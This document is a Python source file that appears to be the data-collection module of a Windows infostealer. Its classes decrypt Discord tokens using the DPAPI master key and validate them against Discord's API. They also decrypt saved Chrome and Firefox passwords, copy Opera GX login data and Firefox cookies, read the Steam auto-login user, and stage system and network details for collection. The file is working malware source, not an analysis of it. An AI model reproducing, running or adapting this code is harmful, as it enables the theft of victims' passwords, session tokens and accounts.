import os
import shutil
import json
import logging
from base64 import b64decode
import requests
from winreg import QueryInfoKey, OpenKey, EnumKey, HKEY_CURRENT_USER, QueryValueEx
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
import chrome_decrypt
import firefox_decrypt
from re import findall
from utils import BASE_GATHER_FOLDER
from abc import ABC, abstractmethod
import platform
import psutil


class Gatherer(ABC):
    @abstractmethod
    def gather(self):
        pass


class BaseGatherer(Gatherer):
    def __init__(self):
        self.name = self.__class__.__name__
        self.dir = f"{BASE_GATHER_FOLDER}/{self.name}/"
        if not os.path.isdir(self.dir):
            os.mkdir(self.dir)

    def gather(self):
        logging.info(f"Gathering: {self.__class__.__name__}")
        self.dir = f"{BASE_GATHER_FOLDER}/{self.name}/"
        if not os.path.isdir(self.dir):
            os.mkdir(self.dir)


class FileGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.paths = []

    def get_all_file_paths(self):
        file_paths = []

        for path in self.paths:
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        file_paths.append(file_path)
            elif os.path.isfile(path):
                file_paths.append(path)

        return file_paths

    def gather(self, gather_dir=""):
        super().gather()
        self.gather_files(gather_dir)

    def gather_files(self, gather_dir=""):
        if gather_dir == "":
            gather_dir = self.dir
        paths = self.get_all_file_paths()
        for path in paths:
            if os.path.isfile(path):
                filename = os.path.basename(path)
                final_file_path = f"{gather_dir}/{filename}"
                while os.path.isfile(final_file_path):
                    final_file_path += '.cpy'
                logging.info(f"Gathering file from {path}. Target: {os.path.abspath(final_file_path)}")
                shutil.copyfile(path, final_file_path)


class DiscordGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "Discord"
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

    def gather(self):
        super().gather()
        roaming = os.getenv('APPDATA')
        appdata = os.getenv('LOCALAPPDATA')
        tokens = []
        uids = []
        discord_dirs = [f"{roaming}/Discord", f"{roaming}/discordcanary", f"{roaming}/discordptb"]
        leveldb_dirs = {
            roaming + '\\discord\\Local Storage\\leveldb\\',
            roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            roaming + '\\discordptb\\Local Storage\\leveldb\\',
        }
        for leveldb_dir in leveldb_dirs:
            if os.path.exists(leveldb_dir):
                for file_name in os.listdir(leveldb_dir):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue

                    for line in [x.strip() for x in open(f'{leveldb_dir}\\{file_name}', errors='ignore').readlines() if
                                 x.strip()]:
                        for y in findall(self.regexp_enc, line):
                            token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]),
                                                     self.get_master_key(roaming + f'\\Discord\\Local State'))

                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in uids:
                                    tokens.append(token)
                                    uids.append(uid)
                            # tokens.append(y)
        with open(f"{self.dir}Discord.txt", "w") as file:
            # Write the dictionary to the file as JSON
            result_str = "Tokens:\n"
            for token in tokens:
                result_str += token + "\n"
            file.write(result_str)

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return ""

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return ""

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})

        if r.status_code == 200:
            return True

        return False


class OperaGXGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "OperaGX"

    def gather(self):
        super().gather()
        opera_dir = f"{os.getenv('APPDATA')}/Opera Software/Opera GX Stable/"
        data_gatherer = FileGatherer()
        data_gatherer.paths = [opera_dir + "History", opera_dir + "Login Data"]
        data_gatherer.gather(f"{BASE_GATHER_FOLDER}/OperaGX/")


class SteamGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "Steam"

    def gather(self):
        super().gather()
        hkey = HKEY_CURRENT_USER
        access_key = OpenKey(hkey, r"SOFTWARE\Valve\Steam")
        login_user, _ = QueryValueEx(access_key, "AutoLoginUser")
        apps = OpenKey(access_key, "Apps")
        num_sub_keys = QueryInfoKey(apps)[0]
        apps_keys_names = []
        for i in range(num_sub_keys):
            sub_key = EnumKey(apps, i)
            apps_keys_names.append(sub_key)

        app_names = []

        for app in apps_keys_names:
            try:
                key = OpenKey(apps, app)
                app_names.append(QueryValueEx(key, "Name")[0])
            except Exception as e:
                logging.error(str(e))
        lines = [login_user, app_names]
        result = f'''Username: {login_user}\nInstalled games: {os.linesep.join(x for x in app_names)}'''

        with open(f"{self.dir}SteamDump.txt", "w") as file:
            # Write the dictionary to the file as JSON
            file.write(result)


class FirefoxGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "Firefox"
        self.profiles = self.get_profiles()

    @staticmethod
    def get_profiles():
        basedir = f"{os.getenv('APPDATA')}/Mozilla/Firefox/Profiles/"
        return [basedir + x for x in os.listdir(f"{os.getenv('APPDATA')}/Mozilla/Firefox/Profiles/")]

    def gather_cookies(self):
        cookie_gatherer = FileGatherer()
        cookie_gatherer.paths = [x + "/cookies.sqlite" for x in self.profiles]
        cookie_gatherer.paths += [x + "/places.sqlite" for x in self.profiles]
        cookie_gatherer.gather(f"{BASE_GATHER_FOLDER}/Firefox/")

    def gather(self):
        super().gather()
        if not os.path.isdir(self.dir):
            os.mkdir(self.dir)
        with open(f'{self.dir}FirefoxDump.json', 'w') as f:
            json.dump(self.run_firefox_decrypt(self.profiles), f)

        self.gather_cookies()

    def run_firefox_decrypt(self, paths):
        outputs: list[dict[str, str]]
        for path in paths:
            # Load Mozilla profile and initialize NSS before asking the user for input
            moz = firefox_decrypt.MozillaInteraction()

            # Start NSS for selected profile
            try:
                moz.load_profile(path)
                # Check if profile is password protected and prompt for a password
                # Decode all passwords
                outputs = moz.decrypt_passwords()
                return outputs
            except Exception as e:
                logging.error(str(e))


class ChromeGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "Chrome"

    def gather(self):
        super().gather()
        chrome_decrypt.get_chrome_passwords(self.dir)


class ScreenshotGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "Screenshot"

    def gather(self):
        pass
        # super().gather()
        # with mss() as sct:
        #     sct.shot()
        # shutil.copyfile("monitor-1.png", f"{BASE_GATHER_FOLDER}screenshot.png")
        # os.remove("monitor-1.png")
class SystemInfoGatherer(BaseGatherer):
    def __init__(self):
        super().__init__()
        self.name = "SystemInfo"

    def get_installed_programs(self):
        programs = ""
        # Open the HKEY_LOCAL_MACHINE hive
        hkey = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
        # Enumerate the installed programs
        for i in range(QueryInfoKey(hkey)[0]):
            # Get the name of the program
            name = EnumKey(hkey, i)
            programs += name + "\n"
        return programs

    def get_network_info(self):
        response = requests.get("https://ipapi.co/json")
        data = response.json()
        return data

    def get_system_info(self):
        # Get the system name and version
        system_name = platform.system()
        system_version = platform.release()

        # Get the CPU name and number of cores
        cpu_name = platform.processor()
        cpu_cores = psutil.cpu_count()

        # Get the total and available memory
        memory_total = psutil.virtual_memory().total
        memory_available = psutil.virtual_memory().available

        # Get the total and used disk space
        disk_total = psutil.disk_usage("/").total
        disk_used = psutil.disk_usage("/").used

        # Return the system information
        return {
            "system_name": system_name,
            "system_version": system_version,
            "cpu_name": cpu_name,
            "cpu_cores": cpu_cores,
            "memory_total": memory_total,
            "memory_available": memory_available,
            "disk_total": disk_total,
            "disk_used": disk_used
        }

    def gather(self):
        super().gather()
        system_info = self.get_system_info()
        network_info = self.get_network_info()
        with open(f"{self.dir}SystemDump.json", "w") as file:
            # Write the dictionary to the file as JSON
            json.dump(system_info, file)
        with open(f"{self.dir}NetworkDump.json", "w") as file:
            # Write the dictionary to the file as JSON
            json.dump(network_info, file)
        with open(f"{self.dir}ProgramsList.txt", "w") as file:
            # Write the dictionary to the file as JSON
            file.write(self.get_installed_programs())
